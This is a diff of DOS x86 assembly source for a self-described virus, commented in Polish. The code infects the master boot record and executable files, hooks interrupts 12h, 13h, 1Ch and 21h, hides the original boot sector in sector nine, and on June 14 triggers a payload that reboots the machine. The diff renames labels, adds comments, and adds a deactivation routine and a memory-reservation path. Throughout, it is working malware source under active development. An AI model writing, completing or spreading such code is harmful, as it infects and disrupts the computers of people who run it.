@@ -37,7 +37,11 @@ P1CH_SEGMENT equ 72h
 P1CH_OFFSET equ 70h
 P21H_SEGMENT equ 86h
 P21H_OFFSET equ 84h
-P21H_ADRES_POBIERZ equ 2500h
+P21H_PRZERWANIE_PROCEDURA_PODMIEN equ 2500h
+P21H_DYSK_PRZEJSCIE equ 0eh
+P21H_PAMIEC_REZERWACJA equ 48h
+P21H_SYSTEM_DATA_POBIERZ equ 2ah
+P21H_S_FLAGI_ADRES_POBIERZ equ 34h
 
 segment main
 
@@ -45,19 +49,21 @@ tablica_partycji_poczatek:
   xor ax, ax
   mov ss, ax
   mov sp, 7c00h
+; pobranie rozmiaru pamięci i obliczenie adresu ostatnich 4kB
   int 12h
   mov cl, 6h
   shl ax, cl
   mov cx, 100h
   sub ax, cx
   mov [adres], ax
-; odczytanie dalszej części wirusa
+; wczytanie dalszej części wirusa pod ten adres
   mov dx, P13H_DYSK_C
   mov cx, 2h
   mov es, ax
   mov bx, 0h
   mov ax, (P13H_SEKTOR_ODCZYTAJ or 6h)
   int 13h
+; przejście do wirusa i części inicjującej
   mov ax, [adres]
   push ax
   mov ax, czesc_inicjujaca
@@ -70,7 +76,7 @@ czesc_inicjujaca:
   mov ss, ax
   mov ds, ax
   mov sp, bufor + 100h
-; odczytanie pierwotnej zawartości sektora pierwszego
+; wczytanie pierwotnej zawartości sektora pierwszego pod adres 0:7c00h
   mov dx, P13H_DYSK_C
   mov cx, 9h
   xor ax, ax
@@ -93,6 +99,7 @@ czesc_inicjujaca:
   pop ds
   ;call przerwanie_1ch_podmiana
   ;call przerwanie_12h_podmiana
+; przejście do bootloadera
   retf
 
 P21H_HASLO equ 0ffffh
@@ -105,7 +112,7 @@ przerwanie_1ch_podmiana:
   mov ds, cx
   xor dx, dx
   mov es, dx
-  mov [licznik], 0h
+  mov [przerwanie_1ch_licznik], 0h
   mov ax, [es:P1CH_OFFSET]
   mov [przerwanie_1ch_offset], ax
   mov word [es:P1CH_OFFSET], przerwanie_1ch_obsluga
@@ -141,17 +148,17 @@ przerwanie_12h_adres dd ?
 przerwanie_12h_obsluga:
   pushf
   cli
-; wywołanie pierwotnej procedury przerwania 12h - pobranie ilości pamięci
+; wywołanie pierwotnej procedury przerwania 12h - pobranie ilości pamięci w kB
   call [cs:przerwanie_12h_adres + 2h]
   sti
-; zarezerwowanie fragmentu pamięci od końca
+; zarezerwowanie ostatnich 4kB pamięci
   sub ax, 4h
   cli
   iret
 
 przerwanie_1ch_offset dw ?
 przerwanie_1ch_segment dw ?
-licznik dw 0h
+przerwanie_1ch_licznik dw 0h
 opoznienie equ 100h
 przerwanie_1ch_obsluga:
   push ax
@@ -159,39 +166,44 @@ przerwanie_1ch_obsluga:
   push dx
   push ds
   push es
+; oczekiwanie 100h wywołań przerwania 1ch na uruchomienie systemu
   mov ax, cs
   mov ds, ax
-  mov ax, licznik
+  mov ax, przerwanie_1ch_licznik
   inc ax
   cmp ax, opoznienie
-  jge zmiana
-  mov [licznik], ax
+  jge system_uruchomiony
+  mov [przerwanie_1ch_licznik], ax
   jmp przerwanie_1ch_obsluga_koniec
-zmiana:
-  mov ah, 2ah
+system_uruchomiony:
+; sprawdzenie czy 14 czerwca
+  mov ah, P21H_SYSTEM_DATA_POBIERZ
   int 21h
   cmp dx, 060eh
-  jne zmien_adresy
+  jne adresy_podmien
   ;call kodowanie
-  ;call dezaktywacja
+  call dezaktywacja
+; uruchomienie ponowne systemu
   mov ax, 0ffffh
   push ax
   mov ax, 0h
   push ax
   retf
-zmien_adresy:
-  mov ah, 34h
+adresy_podmien:
+; sprawdzenie czy system jest zajęty
+  mov ah, P21H_S_FLAGI_ADRES_POBIERZ
   int 21h
   mov ah, [es:bx]
   or ah, ah
   jnz przerwanie_1ch_obsluga_koniec
-  call przerwania_adresy_zmien
+  call przerwania_adresy_podmien
+; przywrócenie pierwotnej procedury obsługi przerwania 1ch
   mov ax, cs
   mov ds, ax
   mov dx, przerwanie_1ch_offset
   mov ax, przerwanie_1ch_segment
   mov ds, ax
-  mov ax, (P21H_ADRES_POBIERZ or 1ch)
+  mov ax, (P21H_PRZERWANIE_PROCEDURA_PODMIEN or 1ch)
   int 21h
 przerwanie_1ch_obsluga_koniec:
   pop es
@@ -200,8 +212,25 @@ przerwanie_1ch_obsluga_koniec:
   pop bx
   pop ax
   iret
+  
+dezaktywacja:
+  mov dx, P13H_DYSK_C
+  mov cx, 9h
+  mov ax, cs
+  mov es, ax
+  mov bx, bufor
+  mov ax, (P13H_SEKTOR_ODCZYTAJ or 1h)
+  int 13h
+  mov dx, P13H_DYSK_C
+  mov cx, 1h
+  mov ax, cs
+  mov es, ax
+  mov bx, bufor
+  mov ax, (P13H_SEKTOR_ZAPISZ or 1h)
+  int 13h
+  ret
 
-przerwania_adresy_zmien:
+przerwania_adresy_podmien:
   sti
   push ax
   push bx
@@ -209,11 +238,11 @@ przerwania_adresy_zmien:
   push dx
   push ds
   push es
-; sprawdzenie czy adresy zostały już zmienione
+; sprawdzenie czy adresy zostały już podmienione
   mov ax, P21H_HASLO
   int 21h
   cmp ax, P21H_ODZEW
-  je p_adresy_zmien_koniec
+  je p_adresy_podmien_koniec
   mov cx, cs
   mov ds, cx
   xor dx, dx
@@ -230,7 +259,7 @@ przerwania_adresy_zmien:
   mov ax, [es:P21H_SEGMENT]
   mov word [przerwanie_21h_adres + 2h], ax
   mov [es:P21H_SEGMENT], cx
-p_adresy_zmien_koniec:
+p_adresy_podmien_koniec:
   pop es
   pop ds
   pop dx
@@ -243,13 +272,24 @@ p_adresy_zmien_koniec:
 przerwania_przechwycenie:
   push ds
   push es
+; obliczenie długości wirusa w 16B paragrafach
   mov bx, plik_koniec - tablica_partycji_poczatek
   mov cl, 4h
   shr bx, cl
   inc bx
+  mov ah, P21H_PAMIEC_REZERWACJA
+  int 21h
+  jnc pamiec_przydzielona
+; próba ponownej rezerwacji pamięci
+  mov bx, plik_koniec - tablica_partycji_poczatek
+  mov cl, 4h
+  shr bx, cl
+  inc bx
+; pobranie rozmiaru pamięci przydzielonej nosicielowi
   mov ax, ds
   mov es, ax
   mov ax, [es:2h]
+; zmniejszenie go o rozmiar wirusa
   sub ax, bx
   mov [es:2h], ax
   push ax
@@ -261,6 +301,7 @@ przerwania_przechwycenie:
   mov [es:3h], ax
   pop ax
 pamiec_przydzielona:
+; skopiowanie do zarezerwowanej pamięci
   push ax
   mov bx, cs
   mov ds, bx
@@ -270,18 +311,17 @@ pamiec_przydzielona:
   mov cx, plik_koniec + 10h
   cld
   rep movsb
-  mov ax, skok_po_przeniesieniu_w_pamieci
+  mov ax, przerwania_przechwycenie_koniec
   push ax
   retf
-skok_po_przeniesieniu_w_pamieci:
-  call przerwania_adresy_zmien
-koniec_przechwytywania_przerwan:
+przerwania_przechwycenie_koniec:
+  call przerwania_adresy_podmien
   pop es
   pop ds
   ret
 
 przerwanie_21h_adres dd ?
-licznik_zarazen db 0h
+dysk_przejscie_licznik db 0h
 przerwanie_21h_obsluga:
   sti
   push ax
@@ -293,18 +333,18 @@ przerwanie_21h_obsluga:
   push ds
   push es
   pushf
-; sprawdzenie ile plików już zarażono
-  cmp ah, 0eh
-  jne p1
-  mov al, [licznik_zarazen]
+; wykonywane co 80h przejść na dysk
+  cmp ah, P21H_DYSK_PRZEJSCIE
+  jne przerwanie_21h_haslo
+  mov al, [dysk_przejscie_licznik]
   inc al
   and al, 7fh
-  mov [licznik_zarazen], al
+  mov [dysk_przejscie_licznik], al
   cmp al, 0h
-  jne p1
+  jne przerwanie_21h_haslo
   call plik_zarazenie
   jmp przerwanie_21h_obsluga_koniec
-p1:
+przerwanie_21h_haslo:
   cmp ax, P21H_HASLO
   jne przerwanie_21h_obsluga_koniec
   popf
@@ -336,7 +376,8 @@ przerwanie_13h_adres dd ?
 przerwanie_13h_obsluga:
   sti
   pushf
-  cmp ah, 2h
+; wykonywane przy odczycie sektora pierwszego
+  cmp ah, (P13H_SEKTOR_ODCZYTAJ shr 2)
   jne przerwanie_13h_obsluga_koniec
   cmp dh, 0h
   jne przerwanie_13h_obsluga_koniec
@@ -346,6 +387,7 @@ przerwanie_13h_obsluga:
   je przerwanie_13h_obsluga_koniec
   cmp cx, 1h
   jne przerwanie_13h_obsluga_koniec
+; pierwotny sektor pierwszy znajduje się w sektorze dziewiątym
   mov cx, 9h
 przerwanie_13h_obsluga_koniec:
   popf
@@ -371,7 +413,8 @@ plik_poczatek:
   push ds
   push es
 ; miejsce na psoty
-  call tablica_partycji_zarazenie
+  ;call przerwania_przechwycenie
+  ;call tablica_partycji_zarazenie
   call plik_zarazenie
   mov dx, cs
   mov ds, dx
